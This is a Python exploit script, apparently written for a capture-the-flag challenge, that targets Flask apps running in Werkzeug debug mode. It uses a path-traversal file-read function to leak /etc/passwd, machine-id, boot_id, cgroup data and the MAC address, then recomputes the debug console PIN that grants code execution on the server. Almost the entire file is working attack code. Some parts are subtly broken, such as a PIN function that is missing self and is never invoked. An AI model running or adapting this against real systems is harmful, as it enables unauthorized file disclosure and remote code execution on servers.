import requests
from urllib.parse import urlsplit
import re
import hashlib
from itertools import chain

def error(message=""):
    print(f"[ERROR] {message}")
    exit(1)

class WConsoleExtractorException(Exception):
    def __init__(self, message=""):
        self.message = message
        super().__init__(self.message)


class WConsoleExtractor:
    etc_passwd_regex = re.compile(r"(.+):.*:.*:.*:.*:.*:.*")
    modname = "flask.app"
    class_name = "Flask"

    def __init__(self, target:str, leak_function) -> None:
        self.target = target
        if not callable(leak_function):
            error("You leak function is not callable")

        self.leak_function = leak_function

        # Get base url
        splitted = urlsplit(self.target)
        self.base_url = f"{splitted.scheme}://{splitted.netloc}"

        # Initialize session
        self.sess = requests.Session()

        # Check website is up
        if not self.ping():
            error(f"{self.base_url} does not seem to be up, interrupting...")

        # Check Werkzeug
        server = self.check_werkzeug()
        if not server:
            error(f"Werkzeug not detected in {self.base_url}")

        # Check debug mode activated
        debug_mode, content = self.check_debug_mode()
        if not debug_mode:
            error(f"{self.base_url} does not seem to be in debug mode, interrupting...")
        
        # Check leak file function
        etc_passwd = self.leak_function("/etc/passwd")
        if not etc_passwd or not self.etc_passwd_regex.match(etc_passwd):
            error(f"Your leak function does not seem to work, here is the output when attempting to read /etc/passwd:\n{etc_passwd}")

        # Probably public bits
        self.username = self.choose_username(etc_passwd)
        self.python_version = self.get_python_version(server)
        
        self.probably_public_bits = [
            self.username, 
            self.modname,
            self.class_name,
            f"/usr/local/lib/python{self.python_version}/dist-packages/flask/app.py"
        ]
        
        self.machine_id = self.get_machine_id()
        self.uuidnode = self.get_uuid_node()

        self.private_bits = [
            self.uuidnode,
            self.machine_id
        ]
    
    def get(self, path:str):
        return self.sess.get(f"{self.base_url}{path}")
    
    def get_headers(self):
        return self.get("/").headers
    
    def ping(self):
        try:
            r = self.get("/")
            return r.status_code
        except:
            return 0
        
    def check_debug_mode(self):
        r = self.get("/console")
        return r.status_code == 200, r.text
    
    def check_werkzeug(self):
        headers = self.get_headers()
        return headers.get("Server")
    
    # Leaks
    def choose_username(self, etc_passwd:str):
        usernames = []
        for line in etc_passwd.splitlines():
            username = self.etc_passwd_regex.findall(line)[0]
            print(f"{len(usernames)} : {username}")
            usernames.append(username)

        answer = -1
        while answer < 0 or answer > len(usernames):
            try:
                answer = int(input("Choose the number corresponding to the user that launched the app > "))
            except ValueError:
                pass

        return usernames[answer]
    
    def get_python_version(self, server):
        python_version = re.findall(r"Python\/(\d\.\d+)\..*", server)
        if len(python_version) == 0:
            error("Python version not found")
        return python_version[0].strip()
    
    def get_machine_id(self):
        value = ""
        for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id": 
            content = self.leak_function(filename)
            matched = re.findall(r"[0-9a-f\-]+", content)
            if len(matched) > 0:
                value = matched[0]
        
        content2 = self.leak_function("/proc/self/cgroup")
        value += content2.splitlines()[0].strip().rpartition("/")[2]

        return value
    
    def get_uuid_node(self):
        mac = self.leak_function("/sys/class/net/eth0/address")

        matched = re.findall(r"[0-9a-f:]+", mac)

        if len(matched) > 0:
            uuid_node = str(int(matched[0].replace(":", ""), base=16))

        return uuid_node
    
    def compute_pin(probably_public_bits, private_bits):
        #h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
        h = hashlib.sha1()
        for bit in chain(probably_public_bits, private_bits):
            if not bit:
                continue
            if isinstance(bit, str):
                bit = bit.encode('utf-8')
            h.update(bit)
        h.update(b'cookiesalt')
        #h.update(b'shittysalt')

        cookie_name = '__wzd' + h.hexdigest()[:20]

        num = None
        if num is None:
            h.update(b'pinsalt')
            num = ('%09d' % int(h.hexdigest(), 16))[:9]

        rv =None
        if rv is None:
            for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                    rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                  for x in range(0, len(num), group_size))
                    break
            else:
                rv = num

        return rv


from bs4 import BeautifulSoup as bs

base_url = "https://chall-hosting.0xhorizon.eu"

def leak_file(file) -> str:
    r = requests.get(f"https://chall-hosting.0xhorizon.eu/services?search={file}")

    soup = bs(r.text, 'html.parser')

    return soup.find("center").contents[1].strip()

extractor = WConsoleExtractor(
    "https://chall-hosting.0xhorizon.eu",
    leak_file
)